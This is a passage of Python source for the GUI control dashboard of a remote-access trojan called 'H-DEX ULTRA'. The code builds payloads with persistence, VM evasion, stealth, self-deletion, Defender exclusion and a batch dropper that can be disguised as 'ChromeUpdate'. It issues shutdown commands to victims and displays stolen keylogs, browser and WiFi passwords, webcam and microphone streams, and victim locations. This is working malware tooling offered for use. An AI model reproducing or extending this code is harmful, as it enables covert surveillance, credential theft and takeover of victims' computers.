        self.build_name = ctk.CTkEntry(self.builder_form, placeholder_text="Output Filename (e.g. ChromeUpdate)", height=45, corner_radius=12, fg_color=self.colors["bg"], border_color=self.colors["border"])
        self.build_name.pack(fill=tk.X, padx=25, pady=5)

        # Extra Options Setup (2 Columns)
        opt_container = ctk.CTkFrame(self.builder_form, fg_color="transparent")
        opt_container.pack(fill=tk.X, padx=25, pady=15)
        opt_container.columnconfigure((0, 1), weight=1)

        col1 = ctk.CTkFrame(opt_container, fg_color="transparent")
        col1.grid(row=0, column=0, sticky="nsew", padx=(0, 10))

        col2 = ctk.CTkFrame(opt_container, fg_color="transparent")
        col2.grid(row=0, column=1, sticky="nsew", padx=(10, 0))
        
        # Col 1 Options
        self.build_persistence = ctk.CTkCheckBox(col1, text="Persistence (Startup Registry)", text_color=self.colors["text"], font=("Segoe UI", 12))
        self.build_persistence.pack(anchor="w", pady=8)
        self.build_persistence.select()
        
        self.build_anti_vm = ctk.CTkCheckBox(col1, text="Anti-Analysis & VM Evasion", text_color=self.colors["text"], font=("Segoe UI", 12))
        self.build_anti_vm.pack(anchor="w", pady=8)
        self.build_anti_vm.select()
        
        self.build_stealth = ctk.CTkCheckBox(col1, text="Stealth Mode (Hidden Files/Process)", text_color=self.colors["text"], font=("Segoe UI", 12))
        self.build_stealth.pack(anchor="w", pady=8)
        self.build_stealth.select()
        
        self.build_geofence = ctk.CTkCheckBox(col1, text="Geofencing (Allowed Regions Only)", text_color=self.colors["text"], font=("Segoe UI", 12))
        self.build_geofence.pack(anchor="w", pady=8)

        # Col 2 Options
        self.build_melter = ctk.CTkCheckBox(col2, text="Auto-Melt (Delete Original Executable)", text_color=self.colors["text"], font=("Segoe UI", 12))
        self.build_melter.pack(anchor="w", pady=8)
        self.build_melter.select()

        self.build_critical = ctk.CTkCheckBox(col2, text="Critical Process (BSOD on Kill)", text_color=self.colors["text"], font=("Segoe UI", 12))
        self.build_critical.pack(anchor="w", pady=8)

        self.build_defender = ctk.CTkCheckBox(col2, text="AV/Defender Exclusion (Add Path)", text_color=self.colors["text"], font=("Segoe UI", 12))
        self.build_defender.pack(anchor="w", pady=8)
        self.build_defender.select()
        
        # Action Buttons
        btn_f = ctk.CTkFrame(self.builder_form, fg_color="transparent")
        btn_f.pack(fill=tk.X, padx=25, pady=(15, 25))

        self.build_btn = ctk.CTkButton(btn_f, text="COMPILE EXECUTABLE (.exe)", command=self.build_client, height=50, corner_radius=12, fg_color=self.colors["accent"], text_color=self.colors["bg"], hover_color=self.colors["hover"], font=("Segoe UI", 12, "bold"))
        self.build_btn.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))

        self.build_bat_btn = ctk.CTkButton(btn_f, text="GENERATE DROPPER (.bat)", command=self.build_bat_client, height=50, corner_radius=12, fg_color=self.colors["bg"], text_color=self.colors["text"], hover_color=self.colors["hover"], border_width=1, border_color=self.colors["border"], font=("Segoe UI", 12, "bold"))
        self.build_bat_btn.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(5, 5))
        
        self.build_remover_btn = ctk.CTkButton(btn_f, text="GENERATE UNINSTALLER", command=self.build_remover, height=50, corner_radius=12, fg_color=self.colors.get("danger", "red"), text_color="white", hover_color="#C0392B", font=("Segoe UI", 12, "bold"))
        self.build_remover_btn.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(5, 0))
        
        self.build_log = ctk.CTkTextbox(view, fg_color=self.colors["surface"], text_color=self.colors["text_dim"], corner_radius=20, border_width=1, border_color=self.colors["border"], font=("Consolas", 12))
        self.build_log.pack(fill=tk.BOTH, expand=True, padx=20, pady=(0, 20))

    def _create_settings_view(self):
        view = ctk.CTkFrame(self.content_area, fg_color="transparent")
        self.views["settings"] = view
        
        ctk.CTkLabel(view, text="Settings", font=("Segoe UI Light", 24), text_color=self.colors["accent"]).pack(anchor="w", pady=(0, 20))
        
        self.theme_frame = ctk.CTkFrame(view, fg_color=self.colors["surface"], corner_radius=15, border_width=1, border_color=self.colors["border"])
        self.theme_frame.pack(fill=tk.X, pady=10)
        ctk.CTkLabel(self.theme_frame, text="Theme Selection", font=("Segoe UI", 16, "bold"), text_color=self.colors["accent"]).pack(anchor="w", padx=20, pady=(20, 5))
        ctk.CTkLabel(self.theme_frame, text="Choose your preferred visual style for the dashboard.", font=("Segoe UI", 11), text_color=self.colors["text_dim"]).pack(anchor="w", padx=20, pady=(0, 10))
        
        self.theme_menu = ctk.CTkOptionMenu(self.theme_frame, values=list(self.themes.keys()), command=self.apply_theme,
                                            fg_color=self.colors["bg"], button_color=self.colors["accent"], 
                                            button_hover_color=self.colors["hover"], dropdown_fg_color=self.colors["surface"])
        self.theme_menu.set(self.theme_name)
        self.theme_menu.pack(anchor="w", padx=20, pady=(0, 20))

        self.s_frame = ctk.CTkFrame(view, fg_color=self.colors["surface"], corner_radius=15, border_width=1, border_color=self.colors["border"])
        self.s_frame.pack(fill=tk.X, pady=10)
        ctk.CTkLabel(self.s_frame, text="Server Configuration", font=("Segoe UI", 16, "bold"), text_color=self.colors["accent"]).pack(anchor="w", padx=20, pady=(20, 5))
        ctk.CTkLabel(self.s_frame, text="Configure the primary server URI for device communication.", font=("Segoe UI", 11), text_color=self.colors["text_dim"]).pack(anchor="w", padx=20, pady=(0, 10))
        
        self.change_server_btn_settings = ctk.CTkButton(self.s_frame, text="Change Server URI", command=self.change_server, 
                                                        fg_color=self.colors["bg"], border_width=1, border_color=self.colors["border"],
                                                        hover_color=self.colors["hover"], height=35, corner_radius=10)
        self.change_server_btn_settings.pack(anchor="w", padx=20, pady=(0, 20))

        # --- Theme Customization ---
        self.cust_frame = ctk.CTkFrame(view, fg_color=self.colors["surface"], corner_radius=15, border_width=1, border_color=self.colors["border"])
        self.cust_frame.pack(fill=tk.X, pady=10)
        ctk.CTkLabel(self.cust_frame, text="Theme Overrides", font=("Segoe UI", 16, "bold"), text_color=self.colors["accent"]).pack(anchor="w", padx=20, pady=(20, 5))
        
        f_pick = ctk.CTkFrame(self.cust_frame, fg_color="transparent")
        f_pick.pack(fill=tk.X, padx=20, pady=(0, 20))
        
        ctk.CTkLabel(f_pick, text="Custom Accent Color (Hex):").pack(side=tk.LEFT)
        self.custom_accent_entry = ctk.CTkEntry(f_pick, width=100)
        self.custom_accent_entry.insert(0, self.config.get("custom_accent", self.colors["accent"]))
        self.custom_accent_entry.pack(side=tk.LEFT, padx=10)
        
        ctk.CTkButton(f_pick, text="Apply & Save", command=self.save_custom_theme, width=80).pack(side=tk.LEFT, padx=10)
        ctk.CTkButton(f_pick, text="Reset", command=self.reset_custom_theme, width=80, fg_color="gray").pack(side=tk.LEFT)
        
        self.sec_frame = ctk.CTkFrame(view, fg_color=self.colors["surface"], corner_radius=15, border_width=1, border_color=self.colors["border"])
        self.sec_frame.pack(fill=tk.X, pady=10)
        ctk.CTkLabel(self.sec_frame, text="Security & Access", font=("Segoe UI", 16, "bold"), text_color=self.colors["accent"]).pack(anchor="w", padx=20, pady=(20, 5))
        ctk.CTkLabel(self.sec_frame, text="Manage dashboard access and security credentials.", font=("Segoe UI", 11), text_color=self.colors["text_dim"]).pack(anchor="w", padx=20, pady=(0, 10))
        
        self.reset_pass_btn = ctk.CTkButton(self.sec_frame, text="Reset Dashboard Password", command=self.reset_password, 
                                            fg_color=self.colors["danger"], hover_color="#C0392B", height=35, corner_radius=10)
        self.reset_pass_btn.pack(anchor="w", padx=20, pady=(0, 20))
        
    def save_custom_theme(self):
        new_accent = self.custom_accent_entry.get()
        if not new_accent.startswith("#") or len(new_accent) != 7:
            return messagebox.showerror("Error", "Invalid Hex code (e.g. #FF0000)")
        self.config["custom_accent"] = new_accent
        self.save_config()
        self.apply_theme(self.theme_name)
        messagebox.showinfo("Success", "Theme updated.")

    def reset_custom_theme(self):
        if "custom_accent" in self.config:
            del self.config["custom_accent"]
        self.save_config()
        self.apply_theme(self.theme_name)
        messagebox.showinfo("Success", "Theme reset.")

    def apply_theme(self, theme_name):
        self.theme_name = theme_name
        self.colors = self.themes[self.theme_name].copy()
        
        # Apply custom accent if exists
        custom_accent = self.config.get("custom_accent")
        if custom_accent:
            self.colors["accent"] = custom_accent

        self.root.configure(bg=self.colors["bg"])
        self.main_container.configure(fg_color=self.colors["bg"])
        self.sidebar.configure(fg_color=self.colors["surface"])
        self.logo_label.configure(bg=self.colors["surface"])
        self.content_area.configure(fg_color=self.colors["bg"])

        for btn, indicator in self.nav_buttons.values():
            is_active = (btn.cget("text_color") == self.colors["accent"])
            btn.configure(text_color=self.colors["accent"] if is_active else self.colors["text_dim"],
                          hover_color=self.colors["hover"])
            indicator.configure(fg_color=self.colors["accent"] if is_active else "transparent")
        
        # Update settings view
        self.views["settings"].configure(fg_color="transparent")
        self.theme_frame.configure(fg_color=self.colors["surface"], border_color=self.colors["border"])
        self.s_frame.configure(fg_color=self.colors["surface"], border_color=self.colors["border"])
        self.sec_frame.configure(fg_color=self.colors["surface"], border_color=self.colors["border"])
        self.change_server_btn_settings.configure(fg_color=self.colors["bg"], border_color=self.colors["border"])

        # Update dashboard view
        self.views["dashboard"].configure(fg_color="transparent")
        self.device_scroll.configure(fg_color="transparent")
        
        # Update builder view
        self.views["builder"].configure(fg_color="transparent")
        self.builder_form.configure(fg_color=self.colors["surface"], border_color=self.colors["border"])
        self.build_btn.configure(fg_color=self.colors["accent"], text_color=self.colors["bg"])
        self.build_log.configure(fg_color=self.colors["surface"], text_color=self.colors["text_dim"], border_color=self.colors["border"])
        
        # Update about view
        self.views["about"].configure(fg_color="transparent")
        self.about_title.configure(text_color=self.colors["accent"])
        self.about_subtitle.configure(text_color=self.colors["text_dim"])
        self.about_credit.configure(text_color=self.colors["text_dim"])

        self.save_config()

    def reset_password(self):
        if messagebox.askyesno("Reset Password", "Are you sure? You will be asked to set a new password on next restart."):
            if os.path.exists(CONFIG_FILE):
                config = self.load_config()
                config.pop("password_hash", None)
                self.save_config(config)
            messagebox.showinfo("Reset", "Password reset. Please restart the application.")

    def _create_about_view(self):
        view = ctk.CTkFrame(self.content_area, fg_color="transparent")
        self.views["about"] = view
        
        # Scrollable container for about
        about_scroll = ctk.CTkScrollableFrame(view, fg_color="transparent")
        about_scroll.pack(fill=tk.BOTH, expand=True)

        # Header section
        header = ctk.CTkFrame(about_scroll, fg_color=self.colors["surface"], corner_radius=20, border_width=1, border_color=self.colors["border"])
        header.pack(fill=tk.X, pady=(0, 25))
        
        self.about_title = ctk.CTkLabel(header, text="✨ H-DEX ULTRA", font=("Segoe UI", 48, "bold"), text_color=self.colors["accent"])
        self.about_title.pack(pady=(50, 10))
        self.about_subtitle = ctk.CTkLabel(header, text="Next-Generation Remote Administration Tool", font=("Segoe UI", 18), text_color=self.colors["text_dim"])
        self.about_subtitle.pack()
        
        version_badge = ctk.CTkLabel(header, text="v3.1 ULTRA PREMIUM", font=("Segoe UI", 12, "bold"), 
                                      text_color=self.colors["bg"], fg_color=self.colors["accent"],
                                      corner_radius=15, padx=20, pady=8)
        version_badge.pack(pady=30)
        
        # Feature highlights
        features_frame = ctk.CTkFrame(about_scroll, fg_color=self.colors["surface"], corner_radius=20, border_width=1, border_color=self.colors["border"])
        features_frame.pack(fill=tk.X, pady=10)
        
        ctk.CTkLabel(features_frame, text="🚀 PREMIUM FEATURES", font=("Segoe UI", 14, "bold"),
                     text_color=self.colors["text"]).pack(pady=20)
        
        features = [
            ("🔑", "Lifetime Keylogger", "Persistent storage with live streaming"),
            ("🌐", "Browser Extraction", "History and password harvesting"),
            ("🖥️", "Remote Desktop", "Full screen control with mouse/keyboard"),
            ("📁", "File Manager", "Browse, upload, and download files"),
            ("🎛️", "Control Panel", "Comprehensive system and prank controls"),
            ("📷", "Webcam Viewer", "Live webcam stream with snapshot capture"),
            ("🔊", "Microphone Capture", "Real-time audio monitoring"),
            ("🛡️", "Deep Persistence", "4-layer self-healing startup system"),
        ]
        
        # 2-column feature grid
        features_grid = ctk.CTkFrame(features_frame, fg_color="transparent")
        features_grid.pack(fill=tk.X, padx=30, pady=(0, 30))
        features_grid.columnconfigure((0, 1), weight=1)
        
        for idx, (icon, title, desc) in enumerate(features):
            f = ctk.CTkFrame(features_grid, fg_color=self.colors.get("surface_light", self.colors["hover"]), corner_radius=12)
            f.grid(row=idx // 2, column=idx % 2, padx=5, pady=5, sticky="nsew")
            ctk.CTkLabel(f, text=f"{icon}  {title}", font=("Segoe UI", 13, "bold"), 
                         text_color=self.colors["accent"]).pack(anchor="w", padx=15, pady=(12, 0))
            ctk.CTkLabel(f, text=desc, font=("Segoe UI", 11), 
                         text_color=self.colors["text_dim"]).pack(anchor="w", padx=15, pady=(0, 12))

        # Stats footer
        stats_bar = ctk.CTkFrame(about_scroll, fg_color=self.colors["surface"], corner_radius=20, border_width=1, border_color=self.colors["border"])
        stats_bar.pack(fill=tk.X, pady=10)
        stats_inner = ctk.CTkFrame(stats_bar, fg_color="transparent")
        stats_inner.pack(padx=30, pady=20)
        
        for label, value in [("Version", "3.1"), ("Themes", str(len(THEMES))), ("Persistence Layers", "4"), ("Build", "2026.02")]:
            s = ctk.CTkFrame(stats_inner, fg_color="transparent")
            s.pack(side=tk.LEFT, expand=True, padx=20)
            ctk.CTkLabel(s, text=value, font=("Segoe UI", 28, "bold"), text_color=self.colors["accent"]).pack()
            ctk.CTkLabel(s, text=label.upper(), font=("Segoe UI", 10, "bold"), text_color=self.colors["text_dim"]).pack()

        # Credit
        self.about_credit = ctk.CTkLabel(about_scroll, text="made with ♥ by RealMrHecker", font=("Segoe UI", 14), 
                                          text_color=self.colors["text_dim"])
        self.about_credit.pack(pady=25)

    # --- Logic ---
    def start_async_loop(self):
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        self.loop.run_until_complete(self.connect_to_server())

    async def connect_to_server(self):
        while self.running:
            try:
                self.status_label.configure(text="Connecting...", text_color="orange")
                self.status_dot.configure(text_color="orange")
                import ssl
                ssl_context = ssl._create_unverified_context()
                async with websockets.connect(self.server_uri, max_size=10*1024*1024, ssl=ssl_context, ping_interval=20, ping_timeout=10, close_timeout=10) as ws:
                    self.websocket = ws
                    self.status_label.configure(text="Online", text_color=self.colors["success"])
                    self.status_dot.configure(text_color=self.colors["success"])
                    # Sync top dashboard card
                    if len(self.stat_labels) >= 4:
                        self.stat_labels[3].configure(text="Online", text_color=self.colors["success"])
                    
                    await ws.send(json.dumps({"type": "register_dashboard", "token": self.config.get("token", "hdex_admin_2026")}))
                    
                    # Start heartbeat task
                    asyncio.create_task(self.heartbeat(ws))
                    
                    async for msg in ws:
                        try:
                            # Use thread-safe queue for UI updates
                            pkt = json.loads(msg)
                            if pkt.get("type") == "auth_failed":
                                self.root.after(0, lambda: messagebox.showerror("Auth Error", "Dashboard authentication failed. Check your token in config.json."))
                                break
                            if pkt.get("type") == "auth_success":
                                self.root.after(0, lambda: self.status_label.configure(text="Connected (Auth)", text_color=self.colors["success"]))
                                
                            self.root.after(0, self.handle_message, pkt)
                        except: continue
            except socket.gaierror as e:
                # Handle DNS resolution errors specifically
                self.status_label.configure(text="Offline", text_color=self.colors["text"])
                self.status_dot.configure(text_color=self.colors["danger"])
                error_msg = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] DNS resolution failed for {self.server_uri}: {e}\n"
                try:
                    with open("dashboard_error.log", "a", encoding="utf-8") as f:
                        f.write(error_msg)
                except PermissionError:
                    # If we can't write to the log file, print to console instead
                    print(f"Permission error writing to log file: {error_msg}")
                except Exception as log_e:
                    print(f"Error writing to log file: {log_e}")
                await asyncio.sleep(5)
            except Exception as e:
                # Handle any other exceptions
                self.status_label.configure(text="Offline", text_color="red")
                if len(self.stat_labels) >= 4:
                    self.stat_labels[3].configure(text="Offline", text_color="red")
                
                error_msg = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Connection failed: {e}\n"
                try:
                    with open("dashboard_error.log", "a", encoding="utf-8") as f:
                        f.write(error_msg)
                except:
                    pass
                await asyncio.sleep(5)

    async def heartbeat(self, ws):
        """Keep-alive heartbeat for persistent proxies"""
        while self.running and self.websocket == ws:
            try:
                await ws.send(json.dumps({"type": "heartbeat"}))
                await asyncio.sleep(30)
            except:
                break
    def handle_message(self, data):
        t = data.get("type")
        if t == "device_list": self.update_device_list(data.get("devices", []))
        elif t == "screen_frame": 
            if data.get("sender_id") in self.viewers: self.viewers[data.get("sender_id")].update_image(data.get("data"))
        elif t == "webcam_frame":
            if data.get("sender_id") in self.webcam_viewers: self.webcam_viewers[data.get("sender_id")].update_image(data.get("data"))
        elif t == "metrics_data":
            if data.get("sender_id") in self.metrics_viewers: 
                self.metrics_viewers[data.get("sender_id")].update_graphs(
                    data.get("cpu"), 
                    data.get("ram"),
                    data.get("upload_speed", 0),
                    data.get("download_speed", 0)
                )
        elif t == "audio_chunk":
            if data.get("sender_id") in self.microphone_viewers: self.microphone_viewers[data.get("sender_id")].play_audio_chunk(data.get("data"))
        elif t == "dir_list":
            if data.get("sender_id") in self.file_explorers: self.file_explorers[data.get("sender_id")].update_list(data)
        elif t == "command_output":
            sender_id = data.get("sender_id")
            output = data.get("output", "")

            # Check if this is a block/unblock input response
            if "block input" in output.lower():
                messagebox.showinfo("Block Input Result", output)
            # Heuristics for non-terminal outputs (WiFi, Apps, etc.)
            elif "WIFI PASSWORDS" in output:
                self.show_text_viewer("WiFi Passwords", output)
            elif "Product" in output and "Version" in output:
                self.show_text_viewer("Installed Applications", output)
            elif sender_id in self.terminals:
                self.terminals[sender_id].append_output(output)
            # Fallback for Control Panel actions if Terminal is closed
            elif "Registry" in output or "Recycle Bin" in output or "Monitor" in output:
                messagebox.showinfo("Result", output)
        elif t == "process_list":
            if data.get("sender_id") in self.process_managers: self.process_managers[data.get("sender_id")].update_list(data.get("processes"))
        elif t == "file_content":
            self.save_download(data)
        elif t == "location_info":
            self.show_location(data.get("data"))
        elif t == "keylog_dump":
            if data.get("sender_id") in self.keyloggers: self.keyloggers[data.get("sender_id")].update_logs(data.get("logs"))
        elif t == "live_keylog":
            if data.get("sender_id") in self.keyloggers: self.keyloggers[data.get("sender_id")].append_live_key(data.get("key"), data.get("timestamp"))
        elif t == "keylog_history":
            if data.get("sender_id") in self.keyloggers: self.keyloggers[data.get("sender_id")].update_history(data)
        elif t == "clipboard_content":
            # Find the ControlPanelWindow instance and update its clipboard display
            if data.get("sender_id") in self.control_panels:
                self.control_panels[data.get("sender_id")].update_clipboard_display(data.get("content"))
        elif t == "browser_history":
            self.show_browser_history(data)
        elif t == "auth_success":
            self.status_label.configure(text="Online", text_color=self.colors["success"])
            self.status_dot.configure(text_color=self.colors["success"])
        elif t == "auth_failed":
            self.status_label.configure(text="Auth Failed", text_color="red")
            self.status_dot.configure(text_color="red")
            messagebox.showerror("Auth Error", "Dashboard authentication failed! Check your DASHBOARD_TOKEN.")
        elif t == "browser_passwords":
            self.show_browser_passwords(data)
        elif t == "sys_info":
            if data.get("sender_id") in self.sys_infos: self.sys_infos[data.get("sender_id")].update_info(data.get("data"))
        elif t == "network_scan":
            if data.get("sender_id") in self.network_explorers: self.network_explorers[data.get("sender_id")].update_scan(data.get("devices"))
        elif t == "bulk_result":
            if "bulk" in self.bulk_executors: self.bulk_executors["bulk"].append_result(data.get("sender_id"), data.get("output"))
        elif t == "batch_finish":
            if "bulk" in self.bulk_executors: self.bulk_executors["bulk"].notify_finish()
        elif t == "password_result":
            messagebox.showinfo("Password Captured", f"Client: {data.get('password')}")

    def show_location(self, data):
        if not data: return
        
        win = ctk.CTkToplevel(self.root)
        win.title("Live Location")
        win.geometry("400x350")
        win.configure(bg=self.colors["bg"])
        
        ctk.CTkLabel(win, text="Target Location", font=("Segoe UI", 18, "bold"), text_color=self.colors["accent"]).pack(pady=10)
        
        info_frame = ctk.CTkFrame(win, fg_color=self.colors["surface"])
        info_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        fields = [
            ("IP", data.get("query")),
            ("City", data.get("city")),
            ("Region", data.get("regionName")),
            ("Country", data.get("country")),
            ("ISP", data.get("isp")),
            ("Lat/Lon", f"{data.get('lat')}, {data.get('lon')}")
        ]
        
        for k, v in fields:
            f = ctk.CTkFrame(info_frame, fg_color="transparent")
            f.pack(fill=tk.X, pady=2)
            ctk.CTkLabel(f, text=f"{k}:", width=80, anchor="w", text_color=self.colors["text_dim"]).pack(side=tk.LEFT)
            ctk.CTkLabel(f, text=str(v), anchor="w").pack(side=tk.LEFT)

        lat, lon = data.get('lat'), data.get('lon')
        if lat and lon:
            map_url = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}"
            ctk.CTkButton(win, text="Open in Google Maps", command=lambda: subprocess.Popen(f"start {map_url}", shell=True)).pack(pady=20)

    def update_device_list(self, devices):
        # Refresh the stats label
        if len(self.stat_labels) >= 1:
            self.stat_labels[0].configure(text=str(len(devices)))

        for w in self.device_grid.winfo_children(): w.destroy()
        self.device_rows = {}
        
        if not devices:
            self.empty_label.pack(pady=100)
            return
        else:
            self.empty_label.pack_forget()

        for i, dev in enumerate(devices):
            card = self.create_device_card(dev, i)
            self.device_rows[dev["id"]] = card
            
        # Apply current filter if any
        self.filter_devices()

    def filter_devices_by_group(self, choice):
        self.current_group = choice
        # In a real app, you'd filter the list based on the group
        # For now, we trigger a re-filter combined with search
        self.filter_devices(None)

    def toggle_select_all(self):
        state = self.select_all_var.get()
        if state:
            # Select all currently visible
            for dev_id, card in self.device_rows.items():
                if card.winfo_ismapped():
                    self.selected_devices.add(dev_id)
                    card.configure(border_color=self.colors["accent"], border_width=2)
                    try:
                        # Find the checkbox and select it
                        for child in card.winfo_children():
                            if isinstance(child, ctk.CTkCheckBox):
                                child.select()
                    except: pass
        else:
            # Deselect all
            self.selected_devices.clear()
            for card in self.device_rows.values():
                card.configure(border_color=self.colors["border"], border_width=1)
                try:
                    for child in card.winfo_children():
                        if isinstance(child, ctk.CTkCheckBox):
                            child.deselect()
                except: pass

    def create_device_card(self, dev, index):
        row = index // 3
        col = index % 3

        is_selected = dev["id"] in self.selected_devices
        border_col = self.colors["accent"] if is_selected else self.colors["border"]
        
        # Main Card Frame
        card = ctk.CTkFrame(self.device_grid, fg_color=self.colors["surface"], corner_radius=15, border_width=2 if is_selected else 1, border_color=border_col)
        card.grid(row=row, column=col, padx=12, pady=12, sticky="nsew")
        
        # Colored Left Accent (Premium feel)
        accent_bar = ctk.CTkFrame(card, width=6, fg_color=self.colors["success"], corner_radius=5)
        accent_bar.place(relheight=0.9, relx=0.02, rely=0.05)

        # Selection logic
        def toggle_selection(e=None, d=dev["id"], c=card, b=accent_bar):
            if d in self.selected_devices:
                self.selected_devices.remove(d)
                c.configure(border_color=self.colors["border"], border_width=1)
                chk_var.set(False)
            else:
                self.selected_devices.add(d)
                c.configure(border_color=self.colors["accent"], border_width=2)
                chk_var.set(True)

        card.bind("<Button-1>", toggle_selection)

        # Header: Icon & Name
        header = ctk.CTkFrame(card, fg_color="transparent")
        header.pack(fill=tk.X, padx=(25, 10), pady=(15, 5))
        header.bind("<Button-1>", toggle_selection)
        
        os_icon = "🪟" if "windows" in dev.get("name", "").lower() else "💻"
        ctk.CTkLabel(header, text=os_icon, font=("Segoe UI", 20)).pack(side=tk.LEFT)
        ctk.CTkLabel(header, text=dev.get("name", "Unknown").upper(), font=("Segoe UI", 15, "bold"), text_color=self.colors["text"]).pack(side=tk.LEFT, padx=10)
        
        chk_var = ctk.BooleanVar(value=is_selected)
        chk = ctk.CTkCheckBox(header, text="", width=20, height=20, variable=chk_var, corner_radius=4, command=toggle_selection)
        chk.pack(side=tk.RIGHT)

        # Body: Details
        body = ctk.CTkFrame(card, fg_color="transparent")
        body.pack(fill=tk.X, padx=(25, 10), pady=0)
        body.bind("<Button-1>", toggle_selection)

        # Network Info
        conn_lbl = ctk.CTkLabel(body, text=f"   {dev.get('ip', 'Offline')}   ", font=("Segoe UI", 10, "bold"), 
                                fg_color=self.colors.get("surface_light", "#2C2F33"), text_color=self.colors["success"], corner_radius=8)
        conn_lbl.pack(anchor="w", pady=(0, 5))

        note = self.device_notes.get(dev["id"], "")
        if note:
             note_preview = (note[:25] + '..') if len(note) > 25 else note
             ctk.CTkLabel(body, text=f"📝 {note_preview}", font=("Segoe UI", 10, "italic"), text_color=self.colors["accent"]).pack(anchor="w", pady=(0, 5))
             
        id_str = str(dev.get("id", ""))
        ctk.CTkLabel(body, text=f"ID: {id_str[:12]}...", font=("Consolas", 10), text_color=self.colors["text_dim"]).pack(anchor="w", pady=(0, 15))

        # Bottom Actions Bar
        actions = ctk.CTkFrame(card, fg_color=self.colors.get("surface_light", "#1E1E1E"), corner_radius=10)
        actions.pack(fill=tk.X, padx=(20, 15), pady=(0, 15), side=tk.BOTTOM)
        
        for icon, cmd in [("🖥️ Screen", self.open_remote_desktop), ("📁 Files", self.open_file_manager), ("💻 Term", self.open_terminal), ("🎛️ Control", self.open_control_panel)]:
            btn = ctk.CTkButton(actions, text=icon, height=28, corner_radius=6,
                               fg_color="transparent", hover_color=self.colors["hover"], 
                               text_color=self.colors["text"], font=("Segoe UI", 11, "bold"),
                               command=lambda c=cmd, d=dev["id"]: [self.selected_devices.clear(), self.selected_devices.add(d), c()])
            btn.pack(side=tk.LEFT, expand=True, fill=tk.X, padx=2, pady=3)
            
        return card

    def send_json(self, data):
        if self.websocket:
            # Macro Recording Hook
            if self.macro_recording and data.get("type") not in ["ping", "pong", "heartbeat"]:
                # specific target_id is usually replaced by "TARGET" during replay or kept as is?
                # For batch replay, we likely want to ignore target_id and apply to selected.
                # So we strip target_id or mark it.
                cmd_copy = data.copy()
                if "target_id" in cmd_copy: del cmd_copy["target_id"]
                self.macro_buffer.append(cmd_copy)

            asyncio.run_coroutine_threadsafe(self.websocket.send(json.dumps(data)), self.loop)

    # --- Features ---
    def open_remote_desktop(self):
        if not self.selected_devices: return
        for device_id in list(self.selected_devices)[:5]:
            self.viewers[device_id] = ViewerWindow(self.root, device_id, self, self.colors)
            self.send_json({"type": "start_screen_stream", "target_id": device_id})
            # Send initial default settings
            self.send_json({
                "type": "update_screen_stream_settings",
                "target_id": device_id,
                "quality": 50,
                "fps": 10,
                "resolution": "800x600"
            })

    def open_remote_desktop_settings(self):
        if not self.selected_devices: return
        # Settings only apply to the first selected device for now
        device_id = list(self.selected_devices)[0]
        RemoteDesktopSettingsWindow(self.root, device_id, self, self.colors)

    def open_webcam_viewer(self):
        if not self.selected_devices: return
        for device_id in list(self.selected_devices)[:5]:
            self.webcam_viewers[device_id] = WebcamViewerWindow(self.root, device_id, self, self.colors)
            self.send_json({"type": "start_webcam_stream", "target_id": device_id})

    def open_microphone_viewer(self):
        if not self.selected_devices: return
        for device_id in list(self.selected_devices)[:5]:
            self.microphone_viewers[device_id] = MicrophoneViewerWindow(self.root, device_id, self, self.colors)
            self.send_json({"type": "start_audio_stream", "target_id": device_id})

    def open_file_manager(self):
        if not self.selected_devices: return
        for device_id in list(self.selected_devices)[:5]:
            self.file_explorers[device_id] = FileExplorerWindow(self.root, device_id, self, self.colors)
            self.send_json({"type": "list_dir", "target_id": device_id, "path": "."})

    def open_terminal(self):
        if not self.selected_devices: return
        for device_id in list(self.selected_devices)[:5]:
            self.terminals[device_id] = TerminalWindow(self.root, device_id, self, self.colors)

    def open_process_manager(self):
        if not self.selected_devices: return
        for device_id in list(self.selected_devices)[:5]:
            self.process_managers[device_id] = ProcessManagerWindow(self.root, device_id, self, self.colors)
            self.send_json({"type": "get_processes", "target_id": device_id})

    def open_metrics_viewer(self):
        if not self.selected_devices: return
        for device_id in list(self.selected_devices)[:5]:
            self.metrics_viewers[device_id] = MetricsWindow(self.root, device_id, self, self.colors)
            self.send_json({"type": "start_metrics_stream", "target_id": device_id})

    def open_control_panel(self):
        if not self.selected_devices: return
        for device_id in list(self.selected_devices)[:5]:
            self.control_panels[device_id] = ControlPanelWindow(self.root, device_id, self, self.colors)

    def request_shutdown(self):
        if not self.selected_devices: return
        if not messagebox.askyesno("Confirm Shutdown", f"Are you sure you want to shut down {len(self.selected_devices)} devices?"): return
        for device_id in self.selected_devices:
            self.send_json({"type": "execute_command", "target_id": device_id, "command": "shutdown /s /t 0"})

    def broadcast_message(self):
        msg = simpledialog.askstring("Broadcast", "Enter message to send to ALL devices:")
        if not msg: return
        self.send_json({"type": "broadcast_to_devices", "command_type": "show_message", "data": {"title": "ADMIN BROADCAST", "text": msg}})
        messagebox.showinfo("Broadcast", "Message sent to all connected devices.")

    def load_device_notes(self):
        if os.path.exists("notes.json"):
            try:
                with open("notes.json", "r") as f: return json.load(f)
            except: pass
        return {}

    def save_device_notes(self):
        with open("notes.json", "w") as f:
            json.dump(self.device_notes, f, indent=4)

    def set_device_note(self, device_id, note):
        self.device_notes[device_id] = note
        self.save_device_notes()
        # Refresh the card in UI if possible
        if device_id in self.device_rows:
            # Re-creating the card or finding the label would be better
            # For now, just save it. Next refresh will show it.
            pass

    def open_keylogger(self): 
        if not self.selected_devices: return
        for device_id in list(self.selected_devices)[:5]:
            self.keyloggers[device_id] = KeyloggerWindow(self.root, device_id, self, self.colors)

    def open_sys_info(self, target_id=None):
        if target_id:
            targets = [target_id]
        elif self.selected_devices:
            targets = list(self.selected_devices)[:5]
        else:
            return

        for device_id in targets:
            self.sys_infos[device_id] = SystemInfoWindow(self.root, device_id, self, self.colors)
            self.send_json({"type": "get_sys_info", "target_id": device_id})

    def open_network_explorer(self):
        if not self.selected_devices: return messagebox.showwarning("Selection", "Please select a device first.")
        device_id = list(self.selected_devices)[0]
        self.network_explorers[device_id] = NetworkExplorerWindow(self.root, device_id, self, self.colors)
    
    def open_bulk_executor(self):
        if not self.selected_devices: return messagebox.showwarning("Selection", "Select multiple devices for bulk action.")
